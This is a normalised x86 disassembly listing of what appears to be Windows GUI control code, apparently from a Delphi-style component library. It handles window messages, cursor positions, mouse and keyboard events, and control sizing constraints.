call sub_44f7b4
mov esi eax
jmp r-xdata
mov [ ebp - 0x5 ] al
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0xc ]
mov [ eax + 0x4 ] edi
mov eax [ ebp - 0xc ]
mov dl [ ebp + 0x8 ]
mov [ eax + 0x54 ] dl
mov eax [ ebp - 0xc ]
mov edx [ ebp - 0x4 ]
mov [ eax + 0x58 ] edx
mov eax [ ebp - 0xc ]
push edi
lea edi [ eax + 0x44 ]
lea esi [ ebp - 0x1c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
push 0x1
lea eax [ ebp - 0x1c ]
push eax
mov eax edi
call sub_44f7b4
push eax
push 0x0
call MapWindowPoints
mov eax [ ebp - 0x18 ]
push eax
mov ecx [ ebp - 0x1c ]
mov edx [ ebp - 0xc ]
mov eax edi
mov si 0xffb7
call sub_403564
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_403368
retn
push 0x2
lea eax [ ebp - 0x1c ]
push eax
push 0x0
push esi
call MapWindowPoints
lea edx [ ebp - 0x1c ]
mov eax ebx
call sub_448954
test esi esi
je r-xdata
sub_449eac
push ebx
push esi
push edi
add esp 0xffffffe0
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov edi eax
mov ebx [ edi + 0xa0 ]
test ebx ebx
je r-xdata
mov al 0x1
mov ecx edi
xor edx edx
mov eax ebx
mov si 0xffbe
call sub_403564
test al al
jne r-xdata
mov eax ebx
add esp 0x20
pop edi
pop esi
pop ebx
retn
mov edx esp
mov eax edi
call sub_44ad30
mov esi eax
test esi esi
je r-xdata
xor eax eax
jmp r-xdata
mov ecx esp
mov edx esi
mov eax edi
mov si 0xffcc
call sub_403564
mov eax esi
call sub_4489fc
push eax
lea eax [ esp + 0x14 ]
push eax
mov eax esi
call sub_4489b8
mov ecx eax
xor edx edx
xor eax eax
call sub_417264
lea ecx [ esp + 0x10 ]
mov edx esi
mov eax edi
mov si 0xffcc
call sub_403564
jmp r-xdata
mov ebx eax
test bl bl
je r-xdata
sub_449f50
push ebx
push ecx
mov [ esp ] 0x1
cmp [ eax + 0xc2 ] 0x0
je r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
push ecx
lea ecx [ esp + 0x4 ]
push ecx
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0xc4 ]
call [ ebx + 0xc0 ]
sub_449f80
push ebx
push esi
add esp 0xfffffff0
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov esi eax
cmp [ esi + 0x5b ] 0x5
je r-xdata
mov al 0x1
mov eax [ esp ]
mov eax [ eax ]
mov [ esp + 0x8 ] eax
mov eax [ esp + 0x4 ]
mov eax [ eax ]
mov [ esp + 0xc ] eax
lea ecx [ esp + 0xc ]
lea edx [ esp + 0x8 ]
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x34 ]
mov dl [ esi + 0x5b ]
mov ecx edx
test cl cl
je r-xdata
mov ecx [ esp ]
mov ebx [ esp + 0x8 ]
mov [ ecx ] ebx
add cl 0xfd
sub cl 0x2
jae r-xdata
add esp 0x10
pop esi
pop ebx
retn
mov edx [ esp + 0x4 ]
mov ecx [ esp + 0xc ]
mov [ edx ] ecx
jmp r-xdata
sub dl 0x3
jae r-xdata
sub_449fec
push ebx
push esi
push edi
push ecx
mov [ esp ] ecx
mov edi edx
mov esi eax
mov ecx [ esp ]
mov edx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x30 ]
mov ebx eax
test bl bl
je r-xdata
mov eax ebx
pop edx
pop edi
pop esi
pop ebx
retn
mov ecx [ esp ]
mov edx edi
mov eax esi
call sub_44a0ac
sub_44a01c
push ebp
mov ebp esp
push ebx
cmp [ eax + 0xca ] 0x0
je r-xdata
pop ebx
pop ebp
retn 0x8
push ecx
mov ecx [ ebp + 0xc ]
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0xcc ]
call [ ebx + 0xc8 ]
sub_44a04c
push ebx
push esi
add esp 0xfffffff8
mov ebx edx
mov esi eax
push ebx
call GetCursorPos
mov ecx esp
mov edx ebx
mov eax esi
call sub_448af8
mov eax [ esp ]
mov [ ebx ] eax
mov eax [ esp + 0x4 ]
mov [ ebx + 0x4 ] eax
pop ecx
pop edx
pop esi
pop ebx
retn
sub_44a078
push esi
test [ eax + 0x50 ] 0x4
je r-xdata
xor eax eax
pop esi
retn
mov esi [ edx ]
cmp esi 0x204
je r-xdata
mov al 0x1
pop esi
retn
cmp esi 0x205
je r-xdata
cmp esi 0x200
je r-xdata
cmp esi 0x206
je r-xdata
sub_44a0ac
push ebx
push esi
push edi
add esp 0xfffffff0
mov edi ecx
mov esi edx
mov edx [ eax + 0x74 ]
mov edx [ edx + 0x14 ]
test edx edx
jbe r-xdata
xor edx edx
mov [ esp ] edx
mov [ esp ] edx
jmp r-xdata
xor edx edx
mov [ esp + 0x4 ] edx
mov [ esp + 0x4 ] edx
jmp r-xdata
mov edx [ eax + 0x74 ]
mov edx [ edx + 0x10 ]
test edx edx
jbe r-xdata
xor edx edx
mov [ esp + 0x8 ] edx
mov [ esp + 0x8 ] edx
jmp r-xdata
mov edx [ eax + 0x74 ]
mov edx [ edx + 0xc ]
test edx edx
jbe r-xdata
xor edx edx
mov [ esp + 0xc ] edx
mov [ esp + 0xc ] edx
jmp r-xdata
mov edx [ eax + 0x74 ]
mov edx [ edx + 0x8 ]
test edx edx
jbe r-xdata
cmp [ esp ] 0x0
jle r-xdata
mov eax [ esi ]
cmp eax [ esp + 0x8 ]
jle r-xdata
lea edx [ esp + 0x8 ]
push edx
lea edx [ esp + 0x10 ]
push edx
lea ecx [ esp + 0xc ]
lea edx [ esp + 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x38 ]
cmp [ esp + 0x8 ] 0x0
jle r-xdata
cmp [ esp + 0xc ] 0x0
jle r-xdata
mov eax [ esi ]
cmp eax [ esp ]
jge r-xdata
mov eax [ esp + 0x8 ]
mov [ esi ] eax
jmp r-xdata
cmp [ esp + 0x4 ] 0x0
jle r-xdata
mov eax [ edi ]
cmp eax [ esp + 0xc ]
jle r-xdata
mov eax [ esp ]
mov [ esi ] eax
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax [ edi ]
cmp eax [ esp + 0x4 ]
jge r-xdata
mov eax [ esp + 0xc ]
mov [ edi ] eax
jmp r-xdata
mov eax [ esp + 0x4 ]
mov [ edi ] eax
sub_44a180
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0xc ] ecx
mov edx [ ebp + 0x8 ]
mov [ ebp - 0x8 ] edx
xor edx edx
mov [ ebp - 0x4 ] edx
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
pop ebx
mov esp ebp
pop ebp
retn 0x4
lea edx [ ebp - 0x10 ]
mov ebx eax
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
sub_44a1b4
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x54 ]
test al al
je r-xdata
cmp [ ebx + 0xa0 ] 0x0
je r-xdata
mov eax [ ebx + 0x4c ]
mov [ ebx + 0xac ] eax
mov eax [ ebx + 0x48 ]
mov [ ebx + 0xa8 ] eax
pop ebx
retn
pop ebx
retn
cmp [ ebx + 0x9c ] 0x2
je r-xdata
mov eax [ ebx + 0x4c ]
mov [ ebx + 0xb4 ] eax
jmp r-xdata
mov eax [ ebx + 0xa0 ]
mov al [ eax + 0x5b ]
dec eax
sub al 0x2
jae r-xdata
cmp [ ebx + 0x9c ] 0x1
je r-xdata
mov eax [ ebx + 0x48 ]
mov [ ebx + 0xb0 ] eax
mov eax [ ebx + 0xa0 ]
mov al [ eax + 0x5b ]
add al 0xfd
sub al 0x2
jae r-xdata
sub_44a24c
push ebp
mov ebp esp
add esp 0xfffffeec
push ebx
push esi
push edi
mov ebx edx
mov esi eax
test [ esi + 0x1c ] 0x10
je r-xdata
mov eax [ ebx ]
cmp eax 0x100
jb r-xdata
mov eax esi
call sub_45fd40
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0x0
je r-xdata
mov eax [ ebx ]
cmp eax 0x200
jb r-xdata
cmp eax 0x108
ja r-xdata
mov eax [ ebp - 0x14 ]
cmp [ eax + 0x250 ] 0x0
je r-xdata
cmp eax 0xb00b
jne r-xdata
cmp eax 0x20a
ja r-xdata
mov eax esi
call sub_45fd40
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0x0
je r-xdata
mov ecx ebx
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x250 ]
mov edx esi
mov edi [ eax ]
call [ edi + 0x24 ]
test al al
jne r-xdata
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x14 ]
mov edx [ ebx + 0x8 ]
push edx
mov ecx [ ebx + 0x4 ]
mov edx eax
mov eax esi
call sub_448b54
test [ esi + 0x50 ] 0x80
jne r-xdata
mov ecx ebx
mov edx esi
mov eax [ ebp - 0x14 ]
mov edi [ eax ]
call [ edi + 0xf0 ]
test al al
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebx ]
sub eax 0x200
je r-xdata
sub eax 0x203
je r-xdata
jmp r-xdata
mov ecx ebx
mov eax [ rw-data ]
mov eax [ eax ]
mov edx esi
call sub_469564
jmp r-xdata
dec eax
je r-xdata
sub [ ebx ] 0x2
sub eax 0x3
je r-xdata
cmp [ esi + 0x5d ] 0x1
jne r-xdata
dec eax
je r-xdata
sub eax 0x3
jne r-xdata
or [ esi + 0x54 ] 0x1
jmp r-xdata
mov eax esi
mov si 0xffed
call sub_403564
jmp r-xdata
and [ esi + 0x54 ] 0xfffe
jmp r-xdata
dec eax
je r-xdata
jmp r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x20 ] 0x0
je r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x1c ] 0x0
je r-xdata
mov eax [ ebx ]
mov edx [ rw-data ]
cmp eax [ edx + 0x1c ]
jne r-xdata
lea eax [ ebp - 0x114 ]
push eax
call GetKeyboardState
mov eax [ ebx ]
mov [ ebp - 0x10 ] eax
lea eax [ ebp - 0x114 ]
call sub_45fc84
mov [ ebp - 0xc ] al
mov ax [ ebx + 0x4 ]
mov [ ebp - 0xa ] ax
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x8 ] eax
lea edx [ ebp - 0x10 ]
mov eax esi
mov si 0xffc9
call sub_403564
jmp r-xdata
sub_44a3e0
push ebx
push esi
push edi
mov ebx edx
mov esi eax
mov eax [ ebx ]
sub eax 0xc
je r-xdata
mov eax [ ebx + 0x8 ]
call sub_408bdc
mov edi eax
mov eax [ esi + 0x64 ]
call sub_408c08
mov [ esi + 0x64 ] edi
mov eax [ ebx + 0x8 ]
push eax
mov ecx [ ebx + 0x4 ]
mov edx [ ebx ]
mov eax esi
call sub_448b54
dec eax
je r-xdata
mov eax [ esi + 0x64 ]
test eax eax
je r-xdata
dec eax
je r-xdata
mov edi r-xdata
mov edi eax
jmp r-xdata
mov edi [ esi + 0x64 ]
test edi edi
jne r-xdata
jmp r-xdata
pop edi
pop esi
pop ebx
retn
mov ecx [ ebx + 0x4 ]
dec ecx
mov eax [ ebx + 0x8 ]
mov edx edi
call sub_408a34
call sub_4089d0
mov [ ebx + 0xc ] eax
jmp r-xdata
mov eax edi
call sub_4089d0
mov [ ebx + 0xc ] eax
jmp r-xdata
xor eax eax
mov [ ebx + 0xc ] eax
jmp r-xdata
sub_44a488
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x20 ]
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov al [ eax + 0x5e ]
pop ebp
retn
mov edx [ ebp + 0x8 ]
mov al [ eax + 0x5e ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
cmp al [ edx + 0x5e ]
setne al
pop ebp
retn
sub_44a4b8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
push eax
push r-xdata
mov eax [ ebp - 0x8 ]
push eax
push sub_44a47c
push ebp
call sub_44a488
pop ecx
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x4 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_44a508
push ebx
mov ebx eax
cmp [ ebx + 0x122 ] 0x0
je r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
test eax eax
je r-xdata
cmp [ ebx + 0x122 ] 0x0
je r-xdata
cmp [ ebx + 0x6c ] 0x0
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
mov eax [ eax + 0x40 ]
cmp eax [ ebx + 0x120 ]
je r-xdata
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x124 ]
call [ ebx + 0x120 ]
mov edx ebx
mov eax [ ebx + 0x6c ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
jmp r-xdata
mov edx ebx
mov eax [ ebx + 0x124 ]
call [ ebx + 0x120 ]
pop ebx
retn
sub_44a594
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x1 ] cl
cmp [ eax + 0xd2 ] 0x0
je r-xdata
pop ebx
pop ecx
pop ebp
retn 0x8
mov cl [ ebp - 0x1 ]
push ecx
mov ecx [ ebp + 0xc ]
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0xd4 ]
call [ ebx + 0xd0 ]
sub_44a5cc
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
test [ edi + 0x51 ] 0x10
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
cmp [ edi + 0x48 ] 0x8000
jg r-xdata
lea edx [ ebp - 0x8 ]
mov eax edi
call sub_44a04c
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
mov ax [ esi + 0x4 ]
call sub_45fbf4
mov ecx eax
or cl [ ebp + 0x8 ]
mov edx ebx
mov eax edi
mov si 0xffd5
call sub_403564
jmp r-xdata
cmp [ edi + 0x4c ] 0x8000
jle r-xdata
movsx eax [ esi + 0x8 ]
push eax
movsx eax [ esi + 0xa ]
push eax
mov ax [ esi + 0x4 ]
call sub_45fbf4
mov ecx eax
or cl [ ebp + 0x8 ]
mov edx ebx
mov eax edi
mov si 0xffd5
call sub_403564
sub_44a650
push ebx
push esi
mov esi edx
mov ebx eax
mov edx ebx
mov eax ebx
call sub_448b24
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
test [ ebx + 0x50 ] 0x2
je r-xdata
test [ ebx + 0x50 ] 0x8
je r-xdata
mov dl 0x1
mov eax ebx
call sub_4491ec
mov al [ r-xdata ]
push eax
mov edx esi
xor ecx ecx
mov eax ebx
call sub_44a5cc
pop esi
pop ebx
retn
or [ ebx + 0x54 ] 0x2
sub_44a69c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx ebx
mov eax ebx
call sub_448b24
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
pop ebx
retn
sub_44a6b8
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov edx ebx
mov eax ebx
call sub_448b24
mov edx edi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
test [ ebx + 0x50 ] 0x2
je r-xdata
test [ ebx + 0x50 ] 0x8
je r-xdata
mov dl 0x1
mov eax ebx
call sub_4491ec
mov al [ r-xdata ]
push eax
mov edx edi
xor ecx ecx
mov eax ebx
call sub_44a5cc
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffe9
call sub_403564
sub_44a710
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov ebp ecx
mov edi edx
mov esi eax
xor ebx ebx
mov eax [ edi ]
mov [ esp ] eax
mov eax [ ebp ]
mov [ esp + 0x4 ] eax
lea ecx [ esp + 0x4 ]
mov edx esp
mov eax esi
call sub_449fec
test al al
je r-xdata
mov eax ebx
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ esp ]
mov [ esp + 0x8 ] eax
mov eax [ esp + 0x4 ]
mov [ esp + 0xc ] eax
cmp [ esi + 0x5c ] 0x0
je r-xdata
mov bl 0x1
lea ecx [ esp + 0xc ]
lea edx [ esp + 0x8 ]
mov eax esi
call sub_449f80
test al al
je r-xdata
mov eax [ esp + 0x8 ]
mov [ edi ] eax
mov eax [ esp + 0xc ]
mov [ ebp ] eax
lea ecx [ esp + 0xc ]
lea edx [ esp + 0x8 ]
mov eax esi
call sub_449fec
test al al
jne r-xdata
mov eax [ esp + 0x8 ]
cmp eax [ esp ]
jne r-xdata
xor ebx ebx
jmp r-xdata
mov eax [ esp + 0xc ]
cmp eax [ esp + 0x4 ]
je r-xdata
test bl bl
je r-xdata
sub_44a7ac
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov al [ r-xdata ]
push eax
mov edx esi
mov cl 0x1
mov eax ebx
call sub_44a5cc
pop esi
pop ebx
retn
sub_44a7d1
add [ eax ] al
add [ ebx + 0x56 ] dl
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov al [ r-xdata ]
push eax
mov edx esi
mov cl 0x1
mov eax ebx
call sub_44a5cc
pop esi
pop ebx
retn
sub_44a7f7
add [ eax ] al
add [ eax ] al
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov al [ r-xdata ]
push eax
mov edx esi
mov cl 0x2
mov eax ebx
call sub_44a5cc
pop esi
pop ebx
retn
sub_44a821
add [ eax ] al
add [ ebx + 0x56 ] dl
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov al [ r-xdata ]
push eax
mov edx esi
mov cl 0x2
mov eax ebx
call sub_44a5cc
pop esi
pop ebx
retn
sub_44a84c
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x1 ] dl
cmp [ eax + 0xda ] 0x0
je r-xdata
pop ebx
pop ecx
pop ebp
retn 0x4
push ecx
mov edx [ ebp + 0x8 ]
push edx
mov ebx eax
mov edx eax
mov cl [ ebp - 0x1 ]
mov eax [ ebx + 0xdc ]
call [ ebx + 0xd8 ]
sub_44a87c
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
test [ ebx + 0x51 ] 0x10
jne r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
cmp [ ebx + 0x48 ] 0x8000
jg r-xdata
mov edx esp
mov eax ebx
call sub_44a04c
mov eax [ esp + 0x4 ]
push eax
mov ax [ esi + 0x4 ]
call sub_45fbf4
mov edx eax
mov ecx [ esp + 0x4 ]
mov eax ebx
mov si 0xffd4
call sub_403564
jmp r-xdata
cmp [ ebx + 0x4c ] 0x8000
jle r-xdata
movsx eax [ esi + 0xa ]
push eax
mov ax [ esi + 0x4 ]
call sub_45fbf4
mov edx eax
movsx ecx [ esi + 0x8 ]
mov eax ebx
mov si 0xffd4
call sub_403564
sub_44a8f4
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x1 ] cl
cmp [ eax + 0xe2 ] 0x0
je r-xdata
pop ebx
pop ecx
pop ebp
retn 0x8
mov cl [ ebp - 0x1 ]
push ecx
mov ecx [ ebp + 0xc ]
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0xe4 ]
call [ ebx + 0xe0 ]
sub_44a92c
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
test [ edi + 0x51 ] 0x10
jne r-xdata
pop edi
pop esi
pop ebx
retn
movsx eax [ esi + 0x8 ]
push eax
movsx eax [ esi + 0xa ]
push eax
mov ax [ esi + 0x4 ]
call sub_45fbf4
mov ecx eax
mov edx ebx
mov eax edi
mov si 0xffd3
call sub_403564
sub_44a964
push ebx
push esi
push edi
add esp 0xffffffe8
mov edi edx
mov ebx eax
mov edx edi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
test [ ebx + 0x50 ] 0x2
je r-xdata
test [ ebx + 0x54 ] 0x2
je r-xdata
xor edx edx
mov eax ebx
call sub_4491ec
mov edx edi
xor ecx ecx
mov eax ebx
call sub_44a92c
add esp 0x18
pop edi
pop esi
pop ebx
retn
and [ ebx + 0x54 ] 0xfffd
mov edx esp
mov eax [ edi + 0x8 ]
call sub_406e48
push [ esp + 0x4 ]
push [ esp + 0x4 ]
lea edx [ esp + 0x10 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ esp + 0x10 ]
push eax
call PtInRect
test eax eax
je r-xdata
mov eax ebx
mov si 0xffeb
call sub_403564
sub_44a9dc
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov edx esi
mov cl 0x1
mov eax ebx
call sub_44a92c
pop esi
pop ebx
retn
sub_44a9fc
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov edx esi
mov cl 0x2
mov eax ebx
call sub_44a92c
pop esi
pop ebx
retn
sub_44aa1c
push ebx
push esi
push edi
mov ebx edx
mov edi eax
mov eax [ rw-data ]
cmp [ eax + 0x20 ] 0x0
jne r-xdata
mov ax [ ebx + 0x4 ]
call sub_45fbf4
mov [ ebx + 0x4 ] al
mov edx ebx
mov eax edi
mov si 0xffc9
call sub_403564
cmp [ ebx + 0xc ] 0x0
jne r-xdata
mov eax [ rw-data ]
mov [ eax + 0x20 ] 0x1
mov edx 0x68
mov eax [ rw-data ]
call sub_45410c
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax edi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_44aa74
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax esi
call sub_4491dc
test al al
je r-xdata
and [ esi + 0x54 ] 0xfffe
xor edx edx
mov eax esi
call sub_4491ec
test [ esi + 0x54 ] 0x1
je r-xdata
pop esi
retn
push 0xffffffff
xor ecx ecx
mov edx 0x202
mov eax esi
call sub_44a180
pop esi
retn
sub_44aab4
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov ax [ r-xdata ]
and ax [ ebx + 0x1c ]
mov dx [ r-xdata ]
cmp dx ax
jne r-xdata
pop esi
pop ebx
retn
mov eax [ ebx + 0x74 ]
mov edx [ eax + 0xc ]
test edx edx
jbe r-xdata
mov edx [ eax + 0x14 ]
test edx edx
jbe r-xdata
cmp edx [ ebx + 0x48 ]
jge r-xdata
mov edx [ eax + 0x8 ]
test edx edx
jbe r-xdata
cmp edx [ ebx + 0x48 ]
jle r-xdata
mov edx [ ebx + 0x48 ]
mov [ eax + 0xc ] edx
jmp r-xdata
mov edx [ eax + 0x10 ]
test edx edx
jbe r-xdata
cmp edx [ ebx + 0x4c ]
jge r-xdata
mov edx [ ebx + 0x48 ]
mov [ eax + 0x14 ] edx
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
cmp edx [ ebx + 0x4c ]
jle r-xdata
mov edx [ ebx + 0x4c ]
mov [ eax + 0x8 ] edx
jmp r-xdata
cmp [ ebx + 0xa0 ] 0x0
je r-xdata
mov edx [ ebx + 0x4c ]
mov [ eax + 0x10 ] edx
test [ ebx + 0x55 ] 0x4
jne r-xdata
test [ eax + 0x18 ] 0x1
jne r-xdata
cmp [ eax + 0x10 ] 0x0
je r-xdata
cmp [ eax + 0x14 ] 0x0
je r-xdata
mov eax ebx
call sub_44a1b4
sub_44ab62
add [ eax ] al
test [ eax + 0x1c ] 0x10
je r-xdata
cmp [ eax + 0x57 ] 0x0
je r-xdata
test [ eax + 0x51 ] 0x4
je r-xdata
xor ecx ecx
jmp r-xdata
test [ eax + 0x50 ] 0x40
jne r-xdata
retn
mov dl 0x1
call sub_4493fc
mov cl 0x1
sub_44aba4
push ebx
mov ebx eax
cmp [ ebx + 0x5a ] 0x0
je r-xdata
pop ebx
retn
cmp [ edx + 0x4 ] 0x0
je r-xdata
mov eax [ ebx + 0x30 ]
mov edx [ eax + 0x70 ]
mov eax ebx
call sub_449154
mov edx [ edx + 0x8 ]
mov eax ebx
call sub_449154
jmp r-xdata
mov [ ebx + 0x5a ] 0x1
sub_44abd4
push ebx
push esi
mov ebx eax
cmp [ ebx + 0x60 ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov esi [ ebx + 0x30 ]
test esi esi
je r-xdata
mov [ ebx + 0x60 ] 0x1
mov dl [ esi + 0x5f ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x70 ]
sub_44abf8
push ebx
push esi
push edi
add esp 0xfffffff8
mov ebx edx
mov edi eax
xor eax eax
mov [ ebx + 0xc ] eax
mov edx esp
mov eax [ ebx + 0x8 ]
call sub_406e48
push esp
movsx ecx [ ebx + 0x6 ]
mov dl [ ebx + 0x4 ]
mov eax edi
mov si 0xffe2
call sub_403564
test al al
je r-xdata
mov esi [ edi + 0x30 ]
test esi esi
je r-xdata
mov [ ebx + 0xc ] 0x1
jmp r-xdata
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x8 ]
push eax
mov ecx [ ebx + 0x4 ]
mov edx 0xb043
mov eax esi
call sub_44a180
mov [ ebx + 0xc ] eax
sub_44ac9c
push ebx
mov ebx eax
cmp [ ebx + 0x59 ] 0x0
je r-xdata
pop ebx
retn
cmp [ edx + 0x4 ] 0x0
je r-xdata
mov eax [ ebx + 0x30 ]
mov edx [ eax + 0x68 ]
mov eax ebx
call sub_4490a8
mov edx [ edx + 0x8 ]
mov eax ebx
call sub_4490a8
jmp r-xdata
mov [ ebx + 0x59 ] 0x1
sub_44ad30
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx eax
xor esi esi
mov eax ebx
mov edx [ eax ]
call [ edx + 0x58 ]
test eax eax
je r-xdata
mov eax esi
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x58 ]
mov edi eax
mov eax ebx
call sub_4032b0
cmp edi eax
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x58 ]
mov ecx [ rw-data ]
mov ecx [ ecx ]
mov dl 0x1
call [ eax + 0x2c ]
mov esi eax
mov edx [ esp + 0x4 ]
mov eax esi
call sub_448720
mov edx [ esp ]
mov eax esi
call sub_4486fc
mov edx [ esp + 0x8 ]
sub edx [ esp ]
mov eax esi
call sub_4489d0
mov edx [ esp + 0xc ]
sub edx [ esp + 0x4 ]
mov eax esi
call sub_448a14
sub_44adb4
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
add edi 0xfffffffc
lea ecx [ ebp - 0x10 ]
mov eax [ edi ]
mov edx [ eax + 0x44 ]
mov eax [ edi ]
mov eax [ eax + 0x40 ]
call sub_41723c
lea edx [ ebp - 0x10 ]
lea ecx [ ebp - 0x8 ]
mov eax [ edi ]
mov eax [ eax + 0x30 ]
call sub_448acc
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x8 ]
lea ebx [ eax + 0x44 ]
mov eax [ ebx + 0xc ]
sub eax [ ebx + 0x4 ]
mov edx [ edi ]
mov esi [ edx + 0x30 ]
add eax [ esi + 0x4c ]
mov edx [ edi ]
sub eax [ edx + 0x4c ]
push eax
lea eax [ ebp - 0x20 ]
push eax
mov ecx [ ebx + 0x8 ]
sub ecx [ ebx ]
add ecx [ esi + 0x48 ]
mov eax [ edi ]
sub ecx [ eax + 0x48 ]
mov edx [ esi + 0x44 ]
add edx [ ebx + 0x4 ]
sub edx [ ebp - 0x4 ]
mov eax [ esi + 0x40 ]
add eax [ ebx ]
sub eax [ ebp - 0x8 ]
call sub_41728c
lea edx [ ebp - 0x20 ]
mov eax esi
call sub_448974
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_44ae40
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x54 ]
test al al
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
lea edx [ eax + 0x44 ]
mov eax [ ebp - 0x4 ]
call sub_44ad30
mov ebx eax
test ebx ebx
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
